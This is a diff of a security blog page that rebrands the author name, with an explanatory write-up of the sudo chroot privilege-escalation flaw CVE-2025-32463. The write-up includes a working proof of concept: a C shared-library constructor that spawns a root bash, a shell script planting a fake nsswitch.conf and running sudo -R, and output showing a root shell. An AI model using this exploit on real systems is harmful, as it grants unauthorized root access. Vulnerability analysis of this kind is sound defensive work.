@@ -8,8 +8,8 @@
   <meta http-equiv="expires" content="0">
   
     <title>
-      Exploring CVE-2025-32463 local privilege escalation (chwoot) in Sudo | MazeZero</title>
-  <meta name="author" content="M3zeZer0">
+      Exploring CVE-2025-32463 local privilege escalation (chwoot) in Sudo | M3GEV0</title>
+  <meta name="author" content="John Doe">
   
   <meta name="description" content="In this post, we dive into CVE-2025-32463, a recently disclosed vulnerability in Sudo’s -R -chroot option  that allows local privilege escalation by abusing `chroot` in combination with how `nsswitch` resolves system resources. Discovered by Rich Mirch, this flaw makes It  possible for an attacker to trick sudo into loading an arbitrary shared library by creating an `/etc/nsswitch.conf` file under the user-specified root directory.">
   
@@ -17,14 +17,14 @@
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
 
   <meta property="og:title" content="Exploring CVE-2025-32463 local privilege escalation (chwoot) in Sudo"/>
-  <meta property="og:site_name" content="MazeZero"/>
+  <meta property="og:site_name" content="M3GEV0"/>
 
   
     <meta property="og:image" content="favicon.png"/>
   
 
   
-    <link rel="alternative" href="/atom.xml" title="MazeZero" type="application/atom+xml">
+    <link rel="alternative" href="/atom.xml" title="M3GEV0" type="application/atom+xml">
   
   
     <link href="/favicon.png" rel="icon">
@@ -42,7 +42,7 @@
   <!--[if lt IE 9]><script src="//html5shiv.googlecode.com/svn/trunk/html5.js"></script><![endif]-->
 
   <script src="/js/jquery-2.0.3.min.js"></script>
-  <meta name="title" content="vipa0z">
+  <meta name="title" content="magev0">
   <!-- analytics -->
   
 
@@ -63,7 +63,7 @@
 			<span class="icon-bar"></span>
 		</button>
 		<a class="navbar-brand" href="/">
-			MazeZero
+			M3GEV0
 		</a>
 		<div class="collapse navbar-collapse nav-menu">
 			<ul class="nav navbar-nav">
@@ -75,8 +75,8 @@
 					</li>
 					
 					<li>
-						<a href="/cheatsheets/" title="Cheatsheets_and_Notes">
-							<i class="fa fa-book"></i>Cheatsheets & Notes
+						<a href="/cheatsheets/" title="My pentesting notes and CTF Cheatsheets">
+							<i class="fa fa-book"></i>CookBook
 						</a>
 					</li>
 					
@@ -149,10 +149,10 @@
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lowpriv@prod:~$ sudo -l</span><br><span class="line">Matching Defaults entries for lowpriv on prod:</span><br><span class="line">    env_reset,</span><br><span class="line">    mail_badpass,</span><br><span class="line">    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin,</span><br><span class="line">    use_pty,</span><br><span class="line">    runchroot=*</span><br><span class="line">    User lowpriv may run the following commands on prod:</span><br><span class="line">    (root) /bin/bash</span><br><span class="line">lowpriv@prod:~$ sudo -R /web /bin/bash</span><br><span class="line">bash-5.2#</span><br></pre></td></tr></table></figure>
 <h4 id="Creating-a-jail-environment"><a href="#Creating-a-jail-environment" class="headerlink" title="Creating a jail environment"></a>Creating a jail environment</h4><p>To function properly within a chroot jail, the target directory must contain <strong>all required binaries and libraries</strong> needed by chroot such as a shell inside a  bin folder (<code>/bin/bash</code>) and essential shared libraries (like <code>libc</code>, <code>libm</code>, etc.). Without these, the environment may fail to start or function correctly.</p>
 <p>Below is an example  Sudo rule. The lowpriv account is allowed to execute <code>/bin/bash</code> under <code>/web</code>. In this example rule, the user does not pass the chroot directory using the command-line options. Instead, Sudo will <code>chroot</code> to <code>/web</code> prior to executing <code>/bin/bash</code>. Meaning <code>/web</code> becomes bash’s root directory.</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vipa0z $ sudo chroot=/web /bin/bash</span><br><span class="line">after ch:</span><br><span class="line">/web/bin/bash</span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">magev0 $ sudo chroot=/web /bin/bash</span><br><span class="line">after ch:</span><br><span class="line">/web/bin/bash</span><br></pre></td></tr></table></figure>
 
 <p>When the command is executed via Sudo, the root path will be set to <code>/web</code>, so<code> /web/bin/bash</code> must exist along with any linked libraries. The example below of <code>lsof</code> command output shows the lowpriv user running <code>/bin/bash</code> under <code>/web</code> via <code>rtd</code>: (short for root dir).</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">vipa0z $ sudo chroot /web /bin/bash</span><br><span class="line"></span><br><span class="line">vipa0z $ lsof </span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME </span><br><span class="line">bash    160095 root  cwd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  rtd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  txt    REG  252,0  1446024 1048604 /web/bin/bash </span><br><span class="line">bash    160095 root  mem    REG  252,0  2125328 1048600 /web/lib/x86…gnu/libc.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   208328 1048601 /web/lib/x86…libtinfo.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   236616 1048602 /web/lib64/ld-…64.so.2 </span><br></pre></td></tr></table></figure>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">magev0 $ sudo chroot /web /bin/bash</span><br><span class="line"></span><br><span class="line">magev0 $ lsof </span><br><span class="line">COMMAND    PID USER   FD   TYPE DEVICE SIZE/OFF    NODE NAME </span><br><span class="line">bash    160095 root  cwd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  rtd    DIR  252,0     4096 1048596 /web </span><br><span class="line">bash    160095 root  txt    REG  252,0  1446024 1048604 /web/bin/bash </span><br><span class="line">bash    160095 root  mem    REG  252,0  2125328 1048600 /web/lib/x86…gnu/libc.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   208328 1048601 /web/lib/x86…libtinfo.so.6 </span><br><span class="line">bash    160095 root  mem    REG  252,0   236616 1048602 /web/lib64/ld-…64.so.2 </span><br></pre></td></tr></table></figure>
 <p>The <code>rtd</code> entry in <code>lsof</code> confirms that the <strong>root directory</strong> (<code>/</code>, from the perspective of the process) has been <strong>changed using <code>chroot</code></strong>, and is now pointing to <code>/web</code>.</p>
 <p>Additionally, commands like <code>ls</code> or <code>cd</code> won’t work because their binaries were not copied to  the chroot environment: <code>/web</code> , so they simply don’t exist in that directory.</p>
 <h2 id="The-nsswitch-configuration-file"><a href="#The-nsswitch-configuration-file" class="headerlink" title="The nsswitch configuration file"></a>The nsswitch configuration file</h2><p><code>nsswitch.conf</code> (short for <strong>Name Service Switch</strong>) is a configuration file in linux   located at <code>/etc/nsswitch.conf</code>. nsswitch tells the system <strong>how to resolve names and look up various types of information</strong>  such as usernames, hostnames, groups, passwords, and more.</p>
@@ -194,25 +194,25 @@
 <figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd:         files ldap</span><br><span class="line">group:          files ldap</span><br></pre></td></tr></table></figure>
 <p>the above <em>ldap</em> source translates to <code>libnss_ldap.so</code>. When an NSS function uses the <em>ldap</em> source, the library is loaded.</p>
 <p>Because of this behavior,  <strong>any local user can trick Sudo into loading  an arbitrary shared object</strong>, via our own <code>nsswitch</code> that we put inside the chroot directory as <code>/web/etc/nsswitch.conf</code>,  resulting in arbitrary code execution as root. </p>
-<p>To exploit this issue, the following <em>&#x2F;etc&#x2F;nsswitch.conf</em> file was placed inside of the chrooted environment. The <em>&#x2F;vipa0z</em> NSS “source” is translated to <em>libnss</em>&#x2F;vipa0z.so.2, which is a shared object under a path we control.</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd: /vipa0z</span><br></pre></td></tr></table></figure>
+<p>To exploit this issue, the following <em>&#x2F;etc&#x2F;nsswitch.conf</em> file was placed inside of the chrooted environment. The <em>&#x2F;magev0</em> NSS “source” is translated to <em>libnss</em>&#x2F;magev0.so.2, which is a shared object under a path we control.</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">passwd: /magev0</span><br></pre></td></tr></table></figure>
 <p>The folllowing stack trace shows the malicious shared object that has been loaded by Sudo. </p>
-<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  <span class="number">0x0000763a155db181</span> <span class="function">in <span class="title">woot</span> <span class="params">()</span> from libnss_/vipa0z.so.2</span></span><br><span class="line"><span class="function">#1  0x0000763a1612271f in call_init</span></span><br><span class="line"><span class="function">#8  0x0000763a1612a164 in _<span class="title">dl_open</span> <span class="params">(file=<span class="string">&quot;libnss_/vipa0z.so.2&quot;</span>, </span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">14</span> <span class="number">0x0000763a15f53a0f</span> in module_load</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">15</span> <span class="number">0x0000763a15f53ee5</span> in __nss_module_load</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">17</span> <span class="number">0x0000763a15f5460b</span> in __GI___nss_lookup_function</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">19</span> <span class="number">0x0000763a15f50928</span> in __GI___nss_passwd_lookup2</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">20</span> <span class="number">0x0000763a15f62628</span> in __getpwnam_r </span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">21</span> <span class="number">0x0000763a15d59ae8</span> in pam_modutil_getpwnam</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">27</span> <span class="number">0x0000763a15d58d99</span> in pam_acct_mgmt</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">28</span> <span class="number">0x0000763a1577e491</span> in sudo_pam_approval</span></span></span><br></pre></td></tr></table></figure>
+<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line">#<span class="number">0</span>  <span class="number">0x0000763a155db181</span> <span class="function">in <span class="title">woot</span> <span class="params">()</span> from libnss_/magev0.so.2</span></span><br><span class="line"><span class="function">#1  0x0000763a1612271f in call_init</span></span><br><span class="line"><span class="function">#8  0x0000763a1612a164 in _<span class="title">dl_open</span> <span class="params">(file=<span class="string">&quot;libnss_/magev0.so.2&quot;</span>, </span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">14</span> <span class="number">0x0000763a15f53a0f</span> in module_load</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">15</span> <span class="number">0x0000763a15f53ee5</span> in __nss_module_load</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">17</span> <span class="number">0x0000763a15f5460b</span> in __GI___nss_lookup_function</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">19</span> <span class="number">0x0000763a15f50928</span> in __GI___nss_passwd_lookup2</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">20</span> <span class="number">0x0000763a15f62628</span> in __getpwnam_r </span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">21</span> <span class="number">0x0000763a15d59ae8</span> in pam_modutil_getpwnam</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">27</span> <span class="number">0x0000763a15d58d99</span> in pam_acct_mgmt</span></span></span><br><span class="line"><span class="params"><span class="function">#<span class="number">28</span> <span class="number">0x0000763a1577e491</span> in sudo_pam_approval</span></span></span><br></pre></td></tr></table></figure>
 <p><img src="/../images/chwoot/2.png" alt="exploit map"></p>
 <h2 id="The-exploit"><a href="#The-exploit" class="headerlink" title="The exploit"></a>The exploit</h2><p>with all the ABC out of the way, now for the fun part:<br>let’s start by grapping this  PoC, written by <a target="_blank" rel="noopener" href="https://github.com/pr0v3rbs/CVE-2025-32463_chwoot">pr0v3rbst</a> and begin to dissect it<br>This exploit utilizes a shared library object (<code>.so</code>) to create a bash process running as the root user</p>
 <figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line">__attribute__((constructor)) <span class="type">void</span> <span class="title function_">woot</span><span class="params">(<span class="type">void</span>)</span> &#123;</span><br><span class="line">  setreuid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  setregid(<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">  chdir(<span class="string">&quot;/&quot;</span>);</span><br><span class="line">  execl(<span class="string">&quot;/bin/bash&quot;</span>, <span class="string">&quot;/bin/bash&quot;</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 <p>We begin by defining a <strong>constructor function</strong> in C, a special function marked to execute <strong>before <code>main()</code> runs</strong>. Inside this constructor, the process’s <strong>effective user ID and group ID</strong> (<code>euid</code> and <code>egid</code>) are both set to <code>0</code>, giving the process <strong>root-level privileges</strong>.</p>
 <p>Next, the code calls <code>chroot(&quot;/&quot;)</code>, effectively <strong>breaking out of the chroot jail</strong> by resetting the root directory back to the actual system root (<code>/</code>). This bypasses the restricted environment (e.g., <code>/web</code>) and restores full access to the real filesystem.</p>
 <h3 id="nsswitch"><a href="#nsswitch" class="headerlink" title="nsswitch"></a>nsswitch</h3><p>we then <strong>Create a fake <code>nsswitch.conf</code></strong> inside the <code>woot</code> directory and inject the following line:</p>
-<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line">echo &quot;passwd: /vipa0z&quot; &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c</span><br><span class="line"></span><br><span class="line">echo &quot;woot!&quot;</span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf $&#123;STAGE?&#125;</span><br></pre></td></tr></table></figure>
-<p>This instructs the system to treat <code>/vipa0z</code> as the NSS source when resolving user account information (like <code>/etc/passwd</code>). When the system sees this entry, it will attempt to load a shared object named <code>libnss_vipa0z.so</code>.</p>
+<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">mkdir -p woot/etc libnss_</span><br><span class="line">echo &quot;passwd: /magev0&quot; &gt; woot/etc/nsswitch.conf</span><br><span class="line">cp /etc/group woot/etc</span><br><span class="line">gcc -shared -fPIC -Wl,-init,woot -o libnss_/woot1337.so.2 woot1337.c</span><br><span class="line"></span><br><span class="line">echo &quot;woot!&quot;</span><br><span class="line">sudo -R woot woot</span><br><span class="line">rm -rf $&#123;STAGE?&#125;</span><br></pre></td></tr></table></figure>
+<p>This instructs the system to treat <code>/magev0</code> as the NSS source when resolving user account information (like <code>/etc/passwd</code>). When the system sees this entry, it will attempt to load a shared object named <code>libnss_magev0.so</code>.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">cp /etc/group /web/etc</span><br></pre></td></tr></table></figure>
 
 <p><strong>Copy <code>/etc/group</code></strong> into the jail so group lookups don’t fail when the process runs in chroot.</p>
 <ul>
-<li><strong>Compile the shared object</strong> (<code>vipa0z.c</code>) into a <code>.so</code> file and move it to a <code>/libnss_</code> directory (the <em>lib</em> folder)</li>
+<li><strong>Compile the shared object</strong> (<code>magev0.c</code>) into a <code>.so</code> file and move it to a <code>/libnss_</code> directory (the <em>lib</em> folder)</li>
 </ul>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC -Wl,-init,web -o libnss_/vipa0z.so.2 vipa0z.c</span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gcc -shared -fPIC -Wl,-init,web -o libnss_/magev0.so.2 magev0.c</span><br></pre></td></tr></table></figure>
 
 <p>Executing on Ubuntu 24.04.2 LTS server with <code>Sudo v1.9.15p5</code>, using an unprivileged user with no Sudo rules defined, results in a root shell outside of the chrooted environment.</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">lowpriv@prod:~/CVE-2025-32463$ id</span><br><span class="line">uid=1001(lowpriv) gid=1001(lowpriv) groups=1001(lowpriv)</span><br><span class="line">lowpriv@prod:~/CVE-2025-32463$ sudo -l</span><br><span class="line">[sudo] password for lowpriv:</span><br><span class="line">Sorry, user lowpriv may not run sudo on prod.</span><br><span class="line">lowpriv@prod:~/CVE-2025-32463$ ./sudo-chwoot.sh</span><br><span class="line">woot!</span><br><span class="line">root@prod:/# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root),1001(lowpriv)</span><br></pre></td></tr></table></figure>
@@ -244,7 +244,7 @@
 
     
     
-    <a href="/2025/10/22/Remote Code Execution in liferay-jenkins/" type="button" class="btn btn-default"><i
+    <a href="/2025/10/22/abusing-groovy-script-consoles/" type="button" class="btn btn-default"><i
                 class="fa fa-arrow-circle-o-left"></i> Prev</a>
     
 
@@ -329,7 +329,7 @@
   <div class="container-narrow">
   <footer> <p>
   
-  &copy; 2026 M3zeZer0's Blog
+  &copy; 2026 John Doe's Blog
   
 </p>
  </footer>
